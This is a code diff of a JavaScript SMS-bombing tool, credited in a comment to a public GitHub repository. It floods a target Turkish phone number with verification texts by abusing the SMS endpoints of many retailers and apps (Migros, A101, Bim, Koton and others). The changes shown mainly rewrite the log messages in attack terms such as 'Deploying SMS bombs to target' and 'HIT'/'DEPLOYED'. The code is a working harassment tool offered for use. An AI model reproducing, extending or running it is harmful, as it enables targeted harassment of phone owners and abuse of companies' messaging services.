@@ -1,5 +1,3 @@
-
-
 /*
 
 https://github.com/egehan0250/Sms_Bomber_Api/blob/main/functions/sms.js adresinden alınmıştır.
@@ -13,7 +11,10 @@ async function delaySystem(ms) {
 
 async function smsBomber(phone, amount) {
     let systemFinishedT = false;
-    console.log(chalk.gray(`[${dayjs().format('YYYY-MM-DD HH:mm:ss')}] > `) + chalk.greenBright("[smsSystem]") + chalk.blueBright(` ${phone} numarasına ${amount} adet sms gönderiliyor.`));
+    console.log(chalk.gray(`[${dayjs().format('YYYY-MM-DD HH:mm:ss')}] `) + 
+               chalk.red("🎯 [BOMBER]") + 
+               chalk.yellow(` Deploying ${amount} SMS bombs to target: +90${phone}`));
+    
     const queryPromise = new Promise(async (resolve, reject) => {
         try {
             let dataSb = {
@@ -43,14 +44,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 202) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Kigili]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Kigili] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Kigili]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Kigili] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -67,14 +72,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [KahveDünyası]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [KahveDünyası] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [KahveDünyası]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [KahveDünyası] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -98,14 +107,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 202) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [WMF]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [WMF] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [WMF]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [WMF] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -136,14 +149,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [TiklaGelsin]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [TiklaGelsin] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [TiklaGelsin]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [TiklaGelsin] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -159,14 +176,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Bim]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Bim] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Bim]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Bim] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -183,14 +204,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Sok]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Sok] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Sok]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Sok] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -206,14 +231,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Migros]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Migros] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Migros]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Migros] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -230,14 +259,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [A101]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [A101] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [A101]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [A101] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -253,14 +286,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Sakasu]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Sakasu] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Sakasu]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Sakasu] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });     
             }
@@ -276,14 +313,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [ZarinPlus]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [ZarinPlus] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [ZarinPlus]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [ZarinPlus] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -296,14 +337,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [CoreGap]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [CoreGap] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [CoreGap]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [CoreGap] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -322,14 +367,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [ICQ]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [ICQ] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [ICQ]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [ICQ] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 }
                 });
@@ -355,14 +404,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [NaosStars]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [NaosStars] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [NaosStars]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [NaosStars] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -394,14 +447,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Rentiva]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Rentiva] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Rentiva]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Rentiva] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -436,14 +493,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [LoncaMarket]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [LoncaMarket] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [LoncaMarket]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [LoncaMarket] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -460,14 +521,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Kimgb]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Kimgb] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Kimgb]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Kimgb] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -493,14 +558,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Tazi]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Tazi] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Tazi]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Tazi] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -529,14 +598,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Evidea]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Evidea] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Evidea]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Evidea] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -556,14 +629,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [HeyScooter]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [HeyScooter] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [HeyScooter]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [HeyScooter] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -590,14 +667,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Koton]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Koton] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Koton]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Koton] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -633,14 +714,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Ipragaz]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Ipragaz] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Ipragaz]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Ipragaz] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -667,14 +752,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Metro]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Metro] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Metro]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Metro] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -701,14 +790,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Happy]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.green("🚀 [HIT]") +
+                            chalk.cyan(" [Happy] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.green("✅ DEPLOYED"));
                     } else {
                         dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Happy]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
+                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) +
+                            chalk.red("💥 [MISS]") +
+                            chalk.cyan(" [Happy] ") +
+                            chalk.white(`Target: +90${no} `) +
+                            chalk.red("❌ FAILED"));
                     }
                 });
             }
@@ -729,14 +822,18 @@ async function smsBomber(phone, amount) {
                 }, function (err, httpResponse, body) {
                     if (httpResponse?.statusCode == 200) {
                         dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Komagene]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
